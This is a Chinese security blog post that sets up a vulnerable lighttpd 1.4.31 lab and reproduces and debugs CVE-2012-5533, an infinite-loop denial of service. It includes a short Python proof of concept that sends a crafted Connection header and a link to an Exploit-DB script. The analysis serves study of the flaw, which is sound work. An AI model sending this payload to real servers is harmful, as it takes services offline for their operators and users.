> 原文链接: https://www.anquanke.com//post/id/86683 


# 【漏洞分析】lighttpd域处理拒绝服务漏洞环境从复现到分析


                                阅读量   
                                **104525**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**[![](https://p5.ssl.qhimg.com/t01d8d33dc237dc059c.png)](https://p5.ssl.qhimg.com/t01d8d33dc237dc059c.png)**



作者：[virwolf](http://bobao.360.cn/member/contribute?uid=2943513718)

预估稿费：300RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**一．lighttpd域处理拒绝服务漏洞的环境搭建**

****

**1）安装lighttpd**

因为此漏洞需要固定版本,因此我们需要手动安装。



```
wget http://download.lighttpd.net/lighttpd/releases-1.4.x/ lighttpd-1.4.31.tar.gz 
tar -zxvf lighttpd-1.4.31.tar.gz
cd lighttpd-1.4.31
```

到这步时，接下来就是执行

```
./configure
```

命令，但是在这步可能会出现以下错误：

```
configure: error: pcre-config not found, install the pcre-devel package or bui with --without-pcre
```

我们需要执行：

```
yum install gcc glib2-devel openssl-devel pcre-devel bzip2-devel gzip-devel zlib-devel
```

来更新缺失的关联包

安装完毕后，继续执行



```
./configure
make &amp;&amp; make install
```

编译完毕后，执行步骤二。

**2）拷贝lighttpd的执行文件**

创建默认文件：



```
mkdir lighttpd-test
cd lighttpd-test
```

拷贝：

```
cp /usr/local/sbin/lighttpd home/lighttpd-test/
```

**3) 创建配置文件**

```
vim lighttpd.conf
```

编写：



```
server.document-root="/var/www/" 
server.port = 8080
server.username = "www" 
server.groupname = "www" 
mimetype.assign = (
   ".html" =&gt; "text/html", 
   ".txt" =&gt; "text/plain",
   ".jpg" =&gt; "image/jpeg",
   ".png" =&gt; "image/png" 
)
static-file.exclude-extensions = ( ".fcgi", ".php", ".rb", "~", ".inc" )
index-file.names = ( "index.html" )
```

**4）自己编写欢迎页面(index.html)**

```
vim /var/www/index.html
```



```
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Hello&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;This is a test&lt;/h1&gt;
&lt;/body&gt;
&lt;/html&gt;
```

**5）开启防火墙，启动lighttpd服务**

开启防火墙：

```
iptables -I INPUT -p tcp --dport 8080 -j ACCEPT
```

启动服务：

```
./lighttpd -f lighttpd.conf
```

注意：启动服务这里**必须是绝对路径**，也可自己去添加下环境变量（这里的路径是home/lighttpd-test/）。

启动完后显示server started。

接下来，可以进入浏览器测试了：

```
http://127.0.0.1:8080
```

OK,加载后就会显示我们自己编写的欢迎页面。

[![](https://p1.ssl.qhimg.com/t01c0225a6f455fde8e.png)](https://p1.ssl.qhimg.com/t01c0225a6f455fde8e.png)

 

**二．lighttpd拒绝服务漏洞原理及复现**

****

**1）原理：漏洞描述:CVE(CAN) ID: CVE-2012-5533**

lighttpd是一款开源的轻量级Web服务器。

lighttpd 1.4.31在处理某些HTTP请求头时，"http_request_split_value()"函数(src/request.c)在处理特制的"Connection"报头域时会陷入无限循环。攻击者利用此漏洞可导致Lighttpd拒绝服务。

**2）漏洞复现**

漏洞脚本：[https://www.exploit-db.com/exploits/22902/](https://www.exploit-db.com/exploits/22902/)

此脚本为bash脚本，需要改下权限：

在脚本目录下执行命令：

```
chmod +x test.sh
```

然后执行：

```
./test.sh
```

好的，执行成功。

附带python脚本：



```
#encoding: utf-8
import socket
if __name__ == '__main__':
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('192.**.**.**',8080))
    sock.send(b'GET/HTTP/1.1rnHost: pwn.edrnConnection: TE,,Keep-Alivernrn')
    sock.close()
    print('ok')
```

注释：

命令：

```
ps aux | grep "light*"
```

查看lighttpd服务的进程信息。

```
top
```

查看任务管理器

```
kill -9 PID
```

杀死某进程

<br>

**三、动、静结合跟踪漏洞呈现原因**

****

前面我们已知造成漏洞的函数是(src/request.c)里面的"**http_request_split_value()**"函数，因此我们先找到这个函数位置，在这里我直接将这个函数剪切出来了：

[![](https://p5.ssl.qhimg.com/t0160af2e587de88db7.png)](https://p5.ssl.qhimg.com/t0160af2e587de88db7.png)

让我们来仔细看看标红的代码，开始进入函数时b肯定是有值的，所以，会进入for循环，起初state为0，所以会进入case 0，然而，咱们仔细看下，其实case 0里面的for循环是没有被执行的。因此在case 0里，直接state=1;break;跳出switch..case。继续for循环，这时state=1,所以进入case 1中，start=s,然后，这里面for函数里条件不等于‘，’时，i++，然后进入if语句，if语句中条件就是start=s，执行break,因此，又继续for循环，state=1，进入case 1中。

有人说，即使进行for循环，也是有结束的时候啊，那么我们仔细看下第一个for循环，里面i值，其实是根据漏洞利用脚本发送数据而判定的，漏洞脚本里面‘，’前面只有两个字节，所以当等于‘，’时是没有变动的，因此，造成了死循环。

那么，接下来，使用gdb调试器动态调试来验证一下，是不是如我们所说的那样。

运行漏洞利用脚本后，使用命令

```
gdb -p &lt;PID&gt;
```

进入gdb

调试状态：

 [![](https://p2.ssl.qhimg.com/t018eb3ded3c5f5da67.png)](https://p2.ssl.qhimg.com/t018eb3ded3c5f5da67.png)

如图，直接断在了switch 函数这里，继续跟踪

 [![](https://p1.ssl.qhimg.com/t0152bed667e07e5c31.png)](https://p1.ssl.qhimg.com/t0152bed667e07e5c31.png)

如图，可看出它一直在循环。那么让我们检测下，其中的变量值

 [![](https://p1.ssl.qhimg.com/t010a70379d5fabe0bd.png)](https://p1.ssl.qhimg.com/t010a70379d5fabe0bd.png)

这些变量值是没有变的，所以可以确定造成死循环的原因就是i值没有变过 从而无限陷入for循环造成拒绝服务攻击。
